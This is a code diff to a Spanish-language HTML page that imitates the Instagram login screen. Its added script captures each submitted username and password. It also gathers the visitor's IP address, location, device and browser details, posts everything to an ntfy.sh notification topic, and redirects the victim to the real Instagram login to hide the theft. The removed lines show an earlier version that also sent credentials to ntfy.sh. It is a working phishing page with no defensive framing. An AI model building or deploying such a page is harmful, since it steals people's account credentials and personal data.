@@ -12,6 +12,8 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
+      padding: 0;
     }
 
     .container {
@@ -34,6 +36,7 @@
       border: 1px solid #dbdbdb;
       border-radius: 3px;
       background-color: #fafafa;
+      box-sizing: border-box;
     }
 
     .btn-login {
@@ -42,7 +45,10 @@
       border: none;
       color: white;
       font-weight: bold;
+      padding: 8px;
+      border-radius: 4px;
       cursor: pointer;
+      width: 100%;
     }
 
     .btn-login:hover {
@@ -54,6 +60,9 @@
       display: flex;
       align-items: center;
       text-align: center;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: bold;
     }
 
     .separator::before,
@@ -77,12 +86,13 @@
       text-decoration: none;
       display: block;
       margin: 15px 0;
+      font-size: 14px;
     }
 
-    .forgot {
+    .forgot-pw {
       color: #00376b;
-      font-size: 12px;
       text-decoration: none;
+      font-size: 12px;
     }
 
     .signup {
@@ -92,62 +102,97 @@
 
     .signup a {
       color: #3897f0;
-      text-decoration: none;
       font-weight: bold;
+      text-decoration: none;
+    }
+
+    .app-download {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .app-stores {
+      margin-top: 20px;
+    }
+
+    .app-stores img {
+      width: 136px;
+      height: 40px;
+      margin: 0 5px;
     }
   </style>
 </head>
 <body>
-
   <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram Logo" />
+    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" />
     
     <form id="loginForm">
       <input type="text" name="usuario" placeholder="Teléfono, usuario o correo electrónico" required />
       <input type="password" name="contrasena" placeholder="Contraseña" required />
       <button type="submit" class="btn-login">Iniciar sesión</button>
     </form>
-
+    
     <div class="separator">O</div>
-
+    
     <a href="#" class="fb-login">Iniciar sesión con Facebook</a>
-    <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
-
-    <div class="signup">
-      ¿No tienes una cuenta? <a href="#">Regístrate</a>
-    </div>
+    <a href="#" class="forgot-pw">¿Has olvidado la contraseña?</a>
   </div>
 
   <script>
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
       e.preventDefault();
-
+      
       const usuario = this.usuario.value;
       const contrasena = this.contrasena.value;
-
-      const mensaje = `👤 Usuario: ${usuario}\n🔐 Contraseña: ${contrasena}`;
-
-      fetch("https://ntfy.sh/putaslocas", {
-        method: "POST",
-        body: mensaje,
-        headers: {
-          "Title": "Nuevo inicio de sesión",
-          "Priority": "high"
-        }
-      })
-      .then(response => {
-        if (response.ok) {
-          alert("✅ Inicio de sesión exitoso.");
-          this.reset();
-        } else {
-          alert("❌ Error al enviar el inicio de sesión.");
-        }
-      })
-      .catch(error => {
-        alert("❌ Error de red: " + error.message);
-      });
+      
+      try {
+        // Obtener IP del usuario
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+        
+        // Obtener ubicación aproximada
+        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        const locationData = await locationResponse.json();
+        
+        // Obtener información del navegador
+        const userAgent = navigator.userAgent;
+        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const language = navigator.language;
+        
+        // Crear mensaje con toda la información
+        const mensaje = `🔔 Nuevo inicio de sesión detectado:
+👤 Usuario: ${usuario}
+🔐 Contraseña: ${contrasena}
+🌐 IP: ${ip}
+📍 Ubicación: ${locationData.city}, ${locationData.region}, ${locationData.country_name}
+🖥️ Dispositivo: ${userAgent}
+🖥️ Resolución: ${screenResolution}
+⏰ Zona horaria: ${timezone}
+🗣️ Idioma: ${language}`;
+        
+        // Enviar datos (aquí deberías poner tu endpoint)
+        await fetch('https://ntfy.sh/3kG4epWMkei6KLLq', {
+          method: 'POST',
+          headers: {
+            'Title': '⚠️ Nuevo login Instagram',
+            'Priority': 'high'
+          },
+          body: mensaje
+        });
+        
+        // Redirigir después de enviar los datos (opcional)
+        setTimeout(() => {
+          window.location.href = 'https://www.instagram.com/accounts/login/';
+        }, 1500);
+        
+      } catch (error) {
+        console.error("Error al enviar datos:", error);
+        // Redirigir aunque falle el envío de datos
+        window.location.href = 'https://www.instagram.com/accounts/login/';
+      }
     });
   </script>
-
 </body>
 </html>
